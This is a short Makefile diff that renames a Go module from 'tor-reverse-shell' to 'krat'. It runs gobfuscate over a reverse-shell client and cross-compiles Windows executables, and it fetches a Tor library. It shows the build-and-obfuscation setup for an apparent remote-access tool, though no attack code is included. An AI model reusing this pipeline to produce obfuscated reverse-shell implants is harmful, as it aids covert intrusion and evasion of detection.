@@ -5,7 +5,7 @@ prepare:
 	go get -u -v -x github.com/ipsn/go-libtor
 production:
 	go get -u github.com/unixpickle/gobfuscate
-	go run github.com/unixpickle/gobfuscate github.com/humbertovnavarro/tor-reverse-shell cmd/tshell-client/main.go
+	go run github.com/unixpickle/gobfuscate github.com/humbertovnavarro/krat cmd/tshell-client/main.go
 testing:
 	GOOS=windows GOARCH=386 go build  -o ./out/testing/tshell-client.exe cmd/tshell/main.go
 	GOOS=windows GOARCH=amd64 go build  -o ./out/testing/tshell64-client.exe cmd/tshell/main.go
